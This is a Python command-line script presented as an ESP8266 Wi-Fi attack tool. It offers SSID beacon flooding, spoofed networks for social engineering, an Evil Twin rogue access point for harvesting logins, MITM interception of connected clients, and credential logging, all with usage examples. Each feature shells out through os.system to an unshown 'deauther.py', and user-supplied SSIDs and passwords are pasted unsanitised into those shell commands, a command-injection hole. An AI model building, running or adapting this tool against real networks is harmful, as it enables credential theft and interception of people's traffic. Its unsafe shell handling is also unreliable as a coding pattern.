import argparse
import os
import time

# -------------------------------------------
# ESP8266 - SSID Beacon Flooding, Fake AP, Evil Twin & MITM Attack Tool
# -------------------------------------------
# Features:
# - Creates multiple fake SSIDs to overload a target network
# - Can create random or predefined SSIDs
# - Adjustable number of SSIDs and attack duration
# - Supports continuous flooding mode
# - Stealth mode to randomize beacon intervals
# - Spoof legitimate SSIDs for social engineering attacks
# - Evil Twin Attack: Set up a rogue AP for credential harvesting
# - Captures login credentials from connected clients
# - Enables MITM attack to intercept and modify traffic
# - Supports logging of captured credentials
#
# Requirements:
# - ESP8266 / ESP-01S with Deauther firmware
# - Python 3.x
# - PySerial (for communication with ESP8266)
#
# Usage:
# 1. Scan for Wi-Fi networks:
#    python esp8266_ssid_flood.py --scan
# 2. Launch an SSID flooding attack with 50 fake networks:
#    python esp8266_ssid_flood.py --flood --count 50
# 3. Set a duration for the attack (e.g., 30 seconds):
#    python esp8266_ssid_flood.py --flood --count 50 --duration 30
# 4. Enable stealth mode with randomized intervals:
#    python esp8266_ssid_flood.py --flood --count 50 --stealth
# 5. Spoof a specific SSID (e.g., "Free WiFi"):
#    python esp8266_ssid_flood.py --spoof "Free WiFi" --count 20
# 6. Launch an Evil Twin attack with a rogue AP:
#    python esp8266_ssid_flood.py --evil-twin "Company WiFi" --password "fakepass123"
# 7. Start MITM attack on connected clients:
#    python esp8266_ssid_flood.py --mitm
# 8. Enable credential capture logging:
#    python esp8266_ssid_flood.py --log
# -------------------------------------------

def scan_wifi():
    """Scans for available Wi-Fi networks."""
    print("[+] Scanning for Wi-Fi networks...")
    os.system("python deauther.py scan > wifi_scan_results.txt")
    print("[✔] Scan complete. Results saved to wifi_scan_results.txt")

def ssid_flood(count, duration=0, stealth=False, spoof_ssid=None):
    """Performs an SSID flooding attack by creating multiple fake SSIDs."""
    if spoof_ssid:
        print(f"[+] Spoofing SSID '{spoof_ssid}' {count} times...")
        command = f"python deauther.py ssid-flood --spoof '{spoof_ssid}' --count {count}"
    else:
        print(f"[+] Launching SSID flooding attack with {count} fake SSIDs...")
        command = f"python deauther.py ssid-flood --count {count}"
    if duration:
        command += f" --duration {duration}"
    if stealth:
        command += " --stealth"
    os.system(command)
    print("[✔] SSID flooding attack executed.")

def evil_twin(ssid, password):
    """Creates a rogue AP to trick users into connecting and capturing credentials."""
    print(f"[+] Setting up Evil Twin rogue AP: {ssid} with password {password}")
    command = f"python deauther.py evil-twin --ssid '{ssid}' --password '{password}'"
    os.system(command)
    print("[✔] Evil Twin attack running.")

def mitm_attack():
    """Starts a MITM attack on connected clients to intercept and modify traffic."""
    print("[+] Initiating MITM attack on connected clients...")
    os.system("python deauther.py mitm")
    print("[✔] MITM attack in progress.")

def log_credentials():
    """Enables credential capture logging for connected clients."""
    print("[+] Logging credentials from connected clients...")
    os.system("python deauther.py log > credential_log.txt")
    print("[✔] Credentials logged to credential_log.txt")

def main():
    parser = argparse.ArgumentParser(description="ESP8266 - SSID Beacon Flooding, Fake AP, Evil Twin & MITM Attack Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for available Wi-Fi networks")
    parser.add_argument("--flood", action='store_true', help="Launch an SSID flooding attack")
    parser.add_argument("--count", type=int, default=50, help="Number of fake SSIDs to create")
    parser.add_argument("--duration", type=int, help="Duration of the SSID flood attack in seconds")
    parser.add_argument("--stealth", action='store_true', help="Enable stealth mode with randomized intervals")
    parser.add_argument("--spoof", type=str, help="Spoof a specific SSID for social engineering attacks")
    parser.add_argument("--evil-twin", type=str, help="Set up an Evil Twin rogue AP with the specified SSID")
    parser.add_argument("--password", type=str, help="Password for the Evil Twin rogue AP")
    parser.add_argument("--mitm", action='store_true', help="Initiate MITM attack on connected clients")
    parser.add_argument("--log", action='store_true', help="Log credentials from connected clients")
    args = parser.parse_args()

    if args.scan:
        scan_wifi()
    elif args.flood:
        ssid_flood(args.count, args.duration if args.duration else 0, args.stealth, args.spoof)
    elif args.evil_twin and args.password:
        evil_twin(args.evil_twin, args.password)
    elif args.mitm:
        mitm_attack()
    elif args.log:
        log_credentials()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
